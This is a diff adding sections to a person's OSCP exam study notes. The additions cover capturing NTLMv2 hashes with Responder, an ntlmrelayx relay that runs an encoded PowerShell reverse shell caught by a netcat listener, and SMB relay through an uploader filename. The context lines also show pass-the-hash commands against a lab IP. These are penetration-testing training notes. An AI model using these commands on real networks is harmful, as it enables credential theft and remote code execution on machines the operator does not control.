@@ -207,3 +207,23 @@ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abe
 or
 impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 ```
+
+## NTLMv2 Responder Capture and Crack
+
+1. Check IP interfaces: `ip a`
+2. Run Responder with an interface: `sudo responder -I tap0`
+3. Attempt to cennect to Responder's SMB on our Kali machine from the target `dir \\192.168.119.2\test`
+4. A hash should appear on the Responder output
+
+### NTLMv2 Relay Attack
+
+![ntlm_relay_basic](https://github.com/caadams4/OSCP_notes/assets/79220528/2ea911c5-24ed-44d9-8991-390d08730e18)
+
+* Terminal 1: Set up negotation ntlm relay with PS one-liner `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
+* Terminal 2 (Server): Set up listener `nc 192.168.50.211 5555`
+* Terminal 3 (Client): Connect to shell on a comprimised machine and visit fake smb `dir \\192.168.119.2\test`
+* Terminal 2 (Server): Establishes shell on server 
+
+### SMB Relay
+
+Similar to Responder Capture, but change filename in an uploader to `\\\\[responder-ip]\\test`
